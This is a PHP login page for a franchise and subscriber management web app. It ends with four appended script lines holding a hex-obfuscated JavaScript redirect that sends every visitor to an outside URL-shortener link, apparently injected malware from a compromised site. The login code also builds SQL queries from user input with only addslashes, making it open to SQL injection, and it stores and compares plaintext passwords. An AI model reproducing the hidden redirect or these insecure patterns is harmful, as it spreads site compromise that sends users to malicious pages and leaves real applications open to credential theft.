<?php
define("ZW_IN", 'SETUP');
define('DIR_NAME','');
require_once("include/classes/class.Admin.php");
require_once("include/classes/class.Misc.php");
//require $_SERVER['DOCUMENT_ROOT'] . '/min/utils.php';
ini_set('display_errors',0);
$objAdmin = new Admin();
$objMisc  = new Cms();
if (isset($_SESSION['HEADOFFICE'])) {
    header("LOCATION:index.php");
}
$msg = isset($_GET['msg']) ? $_GET['msg'] : '';


if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['login'])){    
    
    $user       = trim(addslashes($_POST['username']));
    $password   = trim(addslashes($_POST['password']));
    if(!empty($user) && !empty($password)){
        $userId       = trim(addslashes($user));
        $password   = trim(addslashes($password));
        $where = "USERNAME = '$userId' and PASSWORD = '$password' ";
        $record = $objMisc->getRow('users',$where);
        $office = $objMisc->getRow('headoffice_master',"HEADOFFICE_ID='$record[headoffice_id]' AND STATUS='A'");
        $franchises=$objMisc->getAllRecords('*','franchise_master',"HEADOFFICE_ID='$record[headoffice_id]'");
        foreach ($franchises as $ey => $vle) {
            $franData[]=array('FRANCHISE_ID'        =>$vle['franchise_id'],
                              'NAME'                =>$vle['name'],
                              'PHONE_NO'            =>$vle['phone_no'],
                              'MOBILE_NO'           =>$vle['mobile_no'],
                              'GSTIN'               =>$vle['gstin'],
                              'ADDRESS'             =>$vle['address'],
                          );
        }
        if($record && $record['user_type']=='A' && !empty($office)){
            $_SESSION['USER_ID']        = $record['user_id'];
            $_SESSION['USER_TYPE']      = $record['user_type'];
            $_SESSION['NAME']           = $record['name'];
            $_SESSION['ADDRESS']        = $record['address'];
            $_SESSION['HEADOFFICE']     = $office['headoffice_id'];
            $_SESSION['HEADOFFICE_NAME']= $office['name'];
            $_SESSION['FRANCHISES']= $franData;

            header("location:/index.php");
            exit;
        }else if($record && $record['user_type']=='E'){
            $empRec=$objMisc->getRow('employees',"EMPLOYEE_ID='$record[id]'");
            $_SESSION['USER_ID']        = $record['user_id'];
            $_SESSION['USER_TYPE']      = $record['user_type'];
            $_SESSION['NAME']           = $empRec['name'];
            $_SESSION['ADDRESS']        = $empRec['address'];
            $_SESSION['HEADOFFICE']     = $office['headoffice_id'];
            $_SESSION['HEADOFFICE_NAME']= $office['name'];
            $_SESSION['FRANCHISES']= $franData;
            $_SESSION['pass']           = unserialize($record['module_permissions']);
            header("location:/index.php");
            exit;
        }else if($record && $record['user_type']=='SP'){
            $_SESSION['USER_ID']        = $record['user_id'];
            $_SESSION['USER_TYPE']      = $record['user_type'];
            $_SESSION['NAME']           = $record['name'];
            $_SESSION['ADDRESS']        = $record['address'];
            header("location:/index.php");
            exit;
        }else if($record && $record['user_type']=='S'){
            $subRec=$objMisc->getRow('subscribers',"SUBSCRIBER_ID='$record[id]'");
        	$fran=$objMisc->getRow('franchise_master',"FRANCHISE_ID='$subRec[franchise_id]'");
            $_SESSION['USER_ID']        = $record['user_id'];
            $_SESSION['SUBSCRIBER_ID']  = $record['id'];
            $_SESSION['USER_TYPE']      = 'S';
            $_SESSION['NAME']           = $subRec['name'];
            $_SESSION['ADDRESS']        = $subRec['address'];
            $_SESSION['CUSTOMER_ID']    = $subRec['customer_id'];
            $_SESSION['PHONE_NO']       = $subRec['phone_no'];
            $_SESSION['FRANCHISE_ID']   = $fran['franchise_id'];
            $_SESSION['FRANCHISE_NAME'] = $fran['name'];
            $_SESSION['MOBILE_NO']      = $fran['mobile_no'];
            $_SESSION['PHONE_NO']       = $fran['phone_no'];
            $_SESSION['GSTIN']          = $fran['gstin'];
            $_SESSION['ADDRESS']        = $fran['address'];
            $_SESSION['HEADOFFICE']     = $office['headoffice_id'];
            $_SESSION['HEADOFFICE_NAME']= $office['name'];
            header("location:/index.php");
            exit;
        } else{
            echo $msg = "Plese check wrong Username and password is entered or connection is barred because of non payment.";exit;
        }
    }
}
switch ($msg)
{
	case 1:
		$msg = "You are Logout Successfully";
	break;
    case 2:
		$msg = "Email Send Successfully Please Login to Continue";
	break;
}

$smartyVars['msg']=$msg;
$smartyVars['cssUri'] = $cssUri;
$smartyVars['jsUri'] = $jsUri;
$smartyVars['username'] = $_REQUEST['username'];
$smartyVars['password'] = $_REQUEST['password'];

$objMisc->displayPage("login",$smartyVars);            
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>